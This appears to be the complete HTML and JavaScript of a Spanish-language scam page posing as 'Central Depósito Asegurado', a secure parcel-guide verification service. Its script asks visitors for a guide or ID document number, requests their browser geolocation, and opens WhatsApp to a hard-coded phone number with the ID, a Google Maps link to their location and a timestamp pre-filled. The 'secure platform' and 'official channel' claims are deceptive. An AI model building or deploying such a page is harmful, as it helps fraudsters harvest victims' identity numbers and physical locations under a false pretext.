<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Central Dep√≥sito Asegurado</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins', sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#002b36,#004d40,#00695c);
}

.container{
    width:90%;
    max-width:420px;
    padding:35px 25px;
    border-radius:25px;
    background:rgba(255,255,255,0.08);
    backdrop-filter:blur(15px);
    box-shadow:0 20px 40px rgba(0,0,0,0.4);
    text-align:center;
    color:white;
}

.logo{
    font-size:42px;
    margin-bottom:15px;
}

h1{
    font-size:26px;
    font-weight:700;
    margin-bottom:8px;
}

.subtitle{
    font-size:14px;
    opacity:0.85;
    margin-bottom:25px;
}

input{
    width:100%;
    padding:14px;
    border:none;
    border-radius:14px;
    margin-bottom:15px;
    font-size:15px;
    outline:none;
    background:rgba(255,255,255,0.95);
}

button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:14px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    margin-top:10px;
    transition:0.3s;
}

.btn-primary{
    background:linear-gradient(90deg,#ff6f00,#ff8f00);
    color:white;
}

.btn-secondary{
    background:linear-gradient(90deg,#004d40,#00796b);
    color:white;
}

button:hover{
    transform:scale(1.03);
}

button:disabled{
    opacity:0.6;
    cursor:not-allowed;
}

.error{
    font-size:13px;
    color:#ffb3b3;
    display:none;
    margin-bottom:10px;
}

.loader-container{
    display:none;
    margin-top:15px;
    font-size:14px;
}

.loader{
    width:22px;
    height:22px;
    border:3px solid rgba(255,255,255,0.3);
    border-top:3px solid white;
    border-radius:50%;
    margin:10px auto;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}

.footer{
    margin-top:20px;
    font-size:11px;
    opacity:0.7;
}
</style>
</head>

<body>

<div class="container">

    <div class="logo">üì¶</div>

    <h1>Consultar gu√≠a</h1>
    <div class="subtitle">
        Plataforma segura de verificaci√≥n dep√≥sito asegurado
    </div>

    <input type="text" id="guia" placeholder="Ingresa n√∫mero de gu√≠a" oninput="soloNumeros(this)">
    <input type="text" id="documento" placeholder="Ingresa n√∫mero de documento" oninput="soloNumeros(this)">

    <div class="error" id="error"></div>

    <button class="btn-primary" id="btnGuia" onclick="consultarGuia()">
        Consultar Gu√≠a
    </button>

    <button class="btn-secondary" id="btnDoc" onclick="consultarDocumento()">
        Chat Bot Documento
    </button>

    <div class="loader-container" id="loaderBox">
        <div class="loader"></div>
        Verificando informaci√≥n...
    </div>

    <div class="footer">
        Servicio exclusivo ‚Ä¢ Canal oficial WhatsApp
    </div>

</div>

<script>

const numeroWhatsApp = "573026219839";
const guiaValida = "0750925931";

function soloNumeros(input){
    input.value = input.value.replace(/[^0-9]/g,'');
}

function mostrarLoader(){
    document.getElementById("loaderBox").style.display="block";
    document.getElementById("btnGuia").disabled = true;
    document.getElementById("btnDoc").disabled = true;
}

function ocultarLoader(){
    document.getElementById("loaderBox").style.display="none";
    document.getElementById("btnGuia").disabled = false;
    document.getElementById("btnDoc").disabled = false;
}

function obtenerUbicacion(callback){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(position){
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            callback("Ubicaci√≥n aproximada: https://maps.google.com/?q=" + lat + "," + lon);
        }, function(){
            callback("Ubicaci√≥n no disponible");
        });
    }else{
        callback("Ubicaci√≥n no soportada");
    }
}

function consultarGuia(){
    var guia = document.getElementById("guia").value.trim();
    var error = document.getElementById("error");

    if(guia !== guiaValida){
        error.innerText = "N√∫mero de gu√≠a inv√°lido";
        error.style.display="block";
        return;
    }

    error.style.display="none";
    mostrarLoader();

    obtenerUbicacion(function(ubicacion){

        setTimeout(function(){

            var mensaje = "üì¶ CONSULTA DEP√ìSITO ASEGURADO%0A"
                        + "Gu√≠a: " + guia + "%0A"
                        + ubicacion + "%0A"
                        + "Fecha: " + new Date().toLocaleString();

            window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");

            ocultarLoader();

        },1500);

    });
}

function consultarDocumento(){
    var doc = document.getElementById("documento").value.trim();
    var error = document.getElementById("error");

    if(doc === ""){
        error.innerText = "Debe ingresar un n√∫mero v√°lido";
        error.style.display="block";
        return;
    }

    error.style.display="none";
    mostrarLoader();

    obtenerUbicacion(function(ubicacion){

        setTimeout(function(){

            var mensaje = "üì¶ CONSULTA DEP√ìSITO ASEGURADO%0A"
                        + "Documento: " + doc + "%0A"
                        + ubicacion + "%0A"
                        + "Fecha: " + new Date().toLocaleString();

            window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");

            ocultarLoader();

        },1500);

    });
}

</script>

</body>
</html>
